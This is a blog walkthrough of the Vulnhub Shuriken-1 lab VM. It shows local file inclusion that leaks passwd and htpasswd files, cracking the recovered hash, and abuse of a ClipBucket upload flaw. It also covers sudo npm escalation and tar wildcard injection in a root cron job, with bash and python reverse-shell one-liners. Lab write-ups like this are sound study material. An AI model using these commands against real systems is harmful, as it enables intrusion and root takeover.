<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>crazyeights225</title>
   
    <link rel="stylesheet" href="../assets/bulma.min.css">
    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script>
    <style>
      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
    </style>
  </head>
  <body>
    <div id="app" class="mt-2">
        <nav class="navbar container" role="navigation" aria-label="main navigation">
            <div class="navbar-brand">
              <a class="navbar-item" href="/">
                <img src="../assets/logo.png">
              </a>
              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
              </a>
            </div>
            <div id="navbar" class="navbar-menu">
              <div class="navbar-start">
                    <a href="../index.html" class="navbar-item">Posts</a>
                    <a href="../projects.html" class="navbar-item">Projects</a>
              </div>
            </div>
          </nav>
    </div>
    <div class="hero-body mt-2" style="background-color: #285aff;">
        <div class="container has-text-centered">
            <h1 class="title" style="color: #f1f1f1;">
                Vulnhub: Shuriken-1
            </h1>
            <h2 class="subtitle" style="color: #f1f1f1;">
                Dec, 2020
            </h2>
        </div>
    </div>
</section>
<section class="container mt-2">
<div class="content column is-10">
    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
        <ul>
          <li><a href="../index.html">Posts</a></li>
          <li><a href="sec.html">CTFs and Vulnerable VMs</a></li>
          <li class="is-active"><a href="#" aria-current="page">Shuriken-1</a></li>
        </ul>
      </nav>
<h3 class="title">Scanning:</h3>
<pre><code><span>crazyeights@es-base:~$ nmap -PS 192.168.56.1-255
    
    Nmap scan report for 192.168.56.129
    Host is up (0.00022s latency).
    Not shown: 998 closed ports
    PORT     STATE    SERVICE
    80/tcp   open     http
    8080/tcp filtered http-proxy
</code></span></pre>
<p>More Detailed Scan:</p>
<pre><code><span>crazyeights@es-base:~$ nmap -A -p- 192.168.56.129
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-28 10:34 EST
Nmap scan report for 192.168.56.129
Host is up (0.00017s latency).
Not shown: 65533 closed ports
PORT     STATE    SERVICE    VERSION
80/tcp   open     http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Shuriken
8080/tcp filtered http-proxy

</code></span></pre>
<h3>Web:</h3>
<img src="images/s1.png" style="width: 80%;">
<h4>Enumeration:</h4>
<pre><code><span>crazyeights@es-base:~$ dirb http://192.168.56.129                                                      

---- Scanning URL: http://192.168.56.129/ ----
==&gt; DIRECTORY: http://192.168.56.129/css/                                      
==&gt; DIRECTORY: http://192.168.56.129/img/                                      
+ http://192.168.56.129/index.php (CODE:200|SIZE:6021)                         
==&gt; DIRECTORY: http://192.168.56.129/js/                                       
==&gt; DIRECTORY: http://192.168.56.129/secret/                                   
+ http://192.168.56.129/server-status (CODE:403|SIZE:279)     
</code></span></pre>
<h4>In secret:</h4>
<p>There is image:</p>
<img src="images/s2.png" style="width: 80%;">
<p>Nothing in the image itself. It is a hint about checking the JS scripts.</p>
<br>
<h4>Checking the JS Scripts:</h4>
<p>In index__7ed54732.js</p>
<pre><code><span>  t.p = 'http://broadcast.shuriken.local',
</code></span></pre>
<p>Added the following to /etc/hosts:</p>
<pre><code><span>192.168.56.129	broadcast.shuriken.local
</code></span></pre>
<p>You get a authentication dialog when you try to visit the site:</p>
<img src="images/s3.png" style="width: 60%;">
<p>So you should probably find credentials first.</p>
<br>
<p>In the other js file (index__d8338055.js"):</p>
<pre><code><span>n.p = 'http://shuriken.local/index.php?referer=',
</code></span></pre>
<p>Try to add that to /etc/hosts instead:</p>
<pre><code><span>192.168.56.129	shuriken.local
</code></span></pre>
<br>
<h4>Local File Inclusion:</h4>
<p>We can perform LFI with referer param:</p>
<p>We test the following and it appears in the page source</p>
<pre><code><span>crazyeights@es-base:~$ curl http://shuriken.local/index.php?referer=../js/index__7ed54732.js
</code></span></pre>
<p>Getting the passwd file, you must use double slashes because single slashes (../) are removed.</p>
<pre><code><span>http://shuriken.local/index.php?referer=..//..//..//..//etc/passwd
</code></span></pre>
<img src="images/s4.png" style="width: 80%;">
<br>
<p>Find the password for the HTTP Authentication by checking for a htpasswd file:</p>
<pre><code><span>crazyeights@es-base:~$ curl http://shuriken.local/index.php?referer=..//..//..//etc/apache2/.htpasswd
</code></span></pre>
<p>On the resulting page:</p>
<pre><code><span>developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
</code></span></pre>
<br>
<h4>Crack with john:</h4>
<pre><code><span>crazyeights@es-base:~$ john --wordlist=lists/rockyou.txt --rules  shuriken_hash 
Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;
Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
9972761drmfsls   (developers)
</code></span></pre>
<p>We now have credentials: developers:9972761drmfsls</p>
<p>Change the line back in the hosts file so you can log in</p>
<pre><code><span>192.168.56.129	broadcast.shuriken.local
</code></span></pre>
<p>We can see it is running ClipBucket version 4</p>
<img src="images/s5.png" style="width: 80%;">
<br>
<h3>ClipBucket Exploit:</h3>
<p>Using searchsploit we find the following:</p>
<p><code><span>ClipBucket &lt; 4.0.0 - Release 4902 - Command I | php/webapps/44250.txt</code></span></p>
<br>
<p>It is vulnerable to CMD Injection, File Upload, and SQLI</p>
<pre><code><span>Proof of concept:
-----------------
1. Unauthenticated OS Command Injection
Without having to authenticate, an attacker can exploit this vulnerability
by manipulating the &quot;file_name&quot; parameter during the file upload in the script
/api/file_uploader.php:

 $ curl -F &quot;Filedata=@pfile.jpg&quot; -F &quot;file_name=aa.php ||&lt;&lt;COMMAND HERE&gt;&gt;&quot;
http://$HOST/api/file_uploader.php

2. Unauthenticated Arbitrary File Upload
Below is the cURL request to upload arbitrary files to the webserver with no
authentication required.

$ curl -F &quot;file=@pfile.php&quot; -F &quot;plupload=1&quot; -F &quot;name=anyname.php&quot;
&quot;http://$HOST/actions/beats_uploader.php&quot;

$ curl -F &quot;file=@pfile.php&quot; -F &quot;plupload=1&quot; -F &quot;name=anyname.php&quot;
&quot;http://$HOST/actions/photo_uploader.php&quot;

</code></span></pre>
<br>
<ul>
<li> Command injection doesn't work
</li>
<li>
Trying file upload, using php-reverse-shell, and the u param for the HTTP Authentication
</li>
</ul>
<p>First start the listener</p>
<pre><code><span>nc -lvp 1234</code></span></pre>
<br>
<pre><code><span>crazyeights@es-base:~/tools$ curl -F &quot;file=@php-reverse-shell.php&quot; -F &quot;plupload=1&quot; -F &quot;name=rshell.php&quot; &quot;http://broadcast.shuriken.local/actions/beats_uploader.php&quot; -u developers:9972761drmfsls

creating file{&quot;success&quot;:&quot;yes&quot;,&quot;file_name&quot;:&quot;16091743966af9ed&quot;,&quot;extension&quot;:&quot;php&quot;,&quot;file_directory&quot;:&quot;CB_BEATS_UPLOAD_DIR&quot;}
</code></span></pre>
<p>Go to the location of the uploaded file to run the script. The filename is randomly generated, and returned in the response from the server.</p>
<img src="images/s6.png" style="width: 80%;">

<h3 class="title">Privilege Escalation:</h3>
<p>Now that we have a session as user www-data we can find user and root flags.</p>
<h4>Checking if www-data can execute anything with elevated permissions:</h4>
<pre><code><span>?&gt;$ sudo -l
Matching Defaults entries for www-data on shuriken:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on shuriken:
    (server-management) NOPASSWD: /usr/bin/npm
$ 
</code></span></pre>
<p>www-data can run npm with the permissions of the user server-management without a password. Use npm script functionality to get a shell.</p>
<pre><code><span>$ cd /tmp
$ npm init
[SNIP]
{
  &quot;name&quot;: &quot;tmp&quot;,
  &quot;version&quot;: &quot;1.0.0&quot;,
  &quot;description&quot;: &quot;&quot;,
  &quot;main&quot;: &quot;index.js&quot;,
  &quot;scripts&quot;: {
    &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;
  },
  &quot;author&quot;: &quot;&quot;,
  &quot;license&quot;: &quot;ISC&quot;
}
[SNIP]
</code></span></pre>
Creating a command to add a script for the shell:
<pre><code><span>echo $(cat package.json | grep -v &quot;}&quot; | grep -v auth | grep -v lice; echo ',&quot;shell&quot;: &quot;/bin/bash&quot;},'; cat package.json | grep 'auth\|lice'; echo &quot;}&quot;) &gt; package.json

</code></span></pre>
The resulting file:
<pre><code><span>$ cat package.json
{ &quot;name&quot;: &quot;tmp&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;index.js&quot;, &quot;scripts&quot;: { &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot; ,&quot;shell&quot;: &quot;/bin/bash&quot;}, &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot; }
</code></span></pre>
Running the npm script as user server-management:
<pre><code><span>
$ sudo -u server-management npm install
$ sudo -u server-management npm run-script shell

&gt; tmp@1.0.0 shell /tmp
&gt; /bin/bash

id
uid=1000(server-management) gid=1000(server-management) groups=1000(server-management),24(cdrom),30(dip),46(plugdev),116(lpadmin),122(sambashare)

</code></span></pre>

<h4>Getting the user flag:</h4>
<pre><code><span>ls /home/server-management
Desktop
Documents
Downloads
Music
Pictures
Public
Shuriken
Templates
Videos
user.txt
cat /home/server-management/user.txt
67528b07b382dfaa490f4dffc57dcdc0
</code></span></pre>

<h4>Getting root:</h4>
<p>Noticed that there were these reports in Documents, thought there might be a job to back them up:</p>
<pre><code><span>/home/server-management/Documents:
Daily Job Progress Report Format.pdf
Employee Search Progress Report.pdf
</code></span></pre>
<p>Finding the job:</p>
<pre><code><span>cat /etc/crontab
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
 # command to install the new version when you edit this file
 # and files in /etc/cron.d. These files also have username fields,
 # that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

 # m h dom mon dow user	command
*/2   * * * *	root	/var/opt/backupsrv.sh
[SNIP]
</code></span></pre>
<h4>The Cronjob Script:</h4>
<p>Notice the use of wildcards. That can be used to execute a script with checkpoint-action</p>
<p>See: https://gtfobins.github.io/gtfobins/tar/</p>
<pre><code><span>cat /var/opt/backupsrv.sh
 #!/bin/bash

 # Where to backup to.
dest=&quot;/var/backups&quot;

 # What to backup. 
cd /home/server-management/Documents
backup_files=&quot;*&quot;

 # Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file=&quot;$hostname-$day.tgz&quot;

 # Print start status message.
echo &quot;Backing up $backup_files to $dest/$archive_file&quot;
date
echo

 # Backup the files using tar.
tar czf $dest/$archive_file $backup_files

 # Print end status message.
echo
echo &quot;Backup finished&quot;
date

 # Long listing of files in $dest to check file sizes.
ls -lh $dest

</code></span></pre>
<p>Create the files:</p>
<pre><code><span>
echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.1/9999 0&gt;&amp;1&quot; &gt; shell.sh
echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot; 
echo &quot;&quot; &gt; &quot;--checkpoint=1&quot;

ls
--checkpoint-action=exec=sh shell.sh
--checkpoint=1
Daily Job Progress Report Format.pdf
Employee Search Progress Report.pdf
shell.sh
</code></span></pre>
<p>The bash reverse shell didn't work, switched to python reverse shell:</p>
<pre><code><span>echo &quot;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.56.1\&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);'&quot; &gt; shell.sh
</code></span></pre>
<p>Start the listener</p>
<pre><code><span>crazyeights@es-base:~$ nc -lvp 9999
    listening on [any] 9999 ...
</code></span></pre>
<p>Waiting two minutes....</p>
<pre><code><span>crazyeights@es-base:~$ nc -lvp 9999
listening on [any] 9999 ...
connect to [192.168.56.1] from broadcast.shuriken.local [192.168.56.129] 51784
/bin/sh: 0: can't access tty; job control turned off
 # id
uid=0(root) gid=0(root) groups=0(root)
 # cd /root
 # ls
root.txt
 # cat root.txt

d0f9655a4454ac54e3002265d40b2edd
</code></span></pre>
<h4>Root Flag: 🥳 </h4>
<img src="images/s7.png" style="width: 80%;">
<h5>FIN.</h5>
</div>
</section>
<footer class="footer">
    <div class="container">
        <div class="columns">
        </div>
    </div>
</footer>
</body>